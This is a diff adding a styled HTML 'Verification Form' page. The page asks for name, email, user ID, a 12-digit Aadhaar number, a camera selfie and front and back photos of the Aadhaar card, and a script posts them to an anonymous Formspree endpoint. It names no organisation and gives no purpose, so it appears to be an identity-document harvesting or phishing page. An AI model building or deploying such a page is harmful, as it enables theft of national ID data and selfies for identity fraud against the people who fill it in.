@@ -1,0 +1,192 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Red Gold Theme Form</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #8b0000, #ffd700);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 15px;
+    }
+    .form-container {
+      background: rgba(0,0,0,0.75);
+      padding: 25px;
+      border-radius: 15px;
+      max-width: 450px;
+      width: 100%;
+      color: #ffd700;
+      box-shadow: 0 0 20px rgba(255,215,0,0.7);
+    }
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ffd700;
+      font-size: 22px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border: 2px solid #ffd700;
+      border-radius: 8px;
+      background: #222;
+      color: #fff;
+      font-size: 15px;
+    }
+    input:focus {
+      outline: none;
+      border-color: #ffea00;
+      box-shadow: 0 0 6px #ffd700;
+    }
+    input[type="file"] {
+      padding: 6px;
+      background: #111;
+      color: #ddd;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(90deg, #ffd700, #8b0000);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      opacity: 0.9;
+      transform: scale(1.02);
+    }
+
+    /* Popup */
+    .popup {
+      display: flex;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+    }
+    .popup.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .popup-content {
+      background: #111;
+      padding: 20px 30px;
+      border-radius: 12px;
+      text-align: center;
+      color: #ffd700;
+      font-size: 18px;
+      box-shadow: 0 0 20px rgba(255,215,0,0.9);
+      animation: scaleIn 0.3s ease;
+    }
+    @keyframes scaleIn {
+      from { transform: scale(0.8); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    @media (max-width: 600px) {
+      .form-container { padding: 20px; }
+      .form-container h2 { font-size: 20px; }
+      input, button { font-size: 14px; padding: 11px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Verification Form</h2>
+    <form id="verifyForm" action="https://formspree.io/f/mrbapwzg" method="POST" enctype="multipart/form-data">
+      <label for="name">Name</label>
+      <input type="text" name="name" id="name" required />
+
+      <label for="email">Email</label>
+      <input type="email" name="email" id="email" required />
+
+      <label for="userid">User ID</label>
+      <input type="text" name="userid" id="userid" required />
+
+      <label for="aadhaar">Aadhaar Number</label>
+      <input type="number" name="aadhaar" id="aadhaar" maxlength="12" placeholder="Enter 12-digit Aadhaar No." required />
+
+      <label for="selfie">Upload Selfie</label>
+      <input type="file" name="selfie" id="selfie" accept="image/*" capture="user" required />
+
+      <label for="aadhaarFront">Aadhaar Front Photo</label>
+      <input type="file" name="aadhaarFront" id="aadhaarFront" accept="image/*" required />
+
+      <label for="aadhaarBack">Aadhaar Back Photo</label>
+      <input type="file" name="aadhaarBack" id="aadhaarBack" accept="image/*" required />
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <!-- Popup -->
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      ✅ Check your Email ID
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('verifyForm');
+    const popup = document.getElementById('popup');
+    const aadhaar = document.getElementById('aadhaar');
+
+    // Aadhaar: sirf 12 digit
+    aadhaar.addEventListener("input", function() {
+      this.value = this.value.replace(/\D/g, "");
+      if (this.value.length > 12) {
+        this.value = this.value.slice(0, 12);
+      }
+    });
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+
+      try {
+        let response = await fetch(form.action, {
+          method: form.method,
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        if (response.ok) {
+          form.reset();
+          popup.classList.add('show');
+          setTimeout(() => {
+            popup.classList.remove('show');
+          }, 3000); // 3 sec me hide
+        } else {
+          alert("Something went wrong. Please try again.");
+        }
+      } catch (error) {
+        alert("Error submitting form. Try again.");
+      }
+    });
+  </script>
+</body>
+</html>
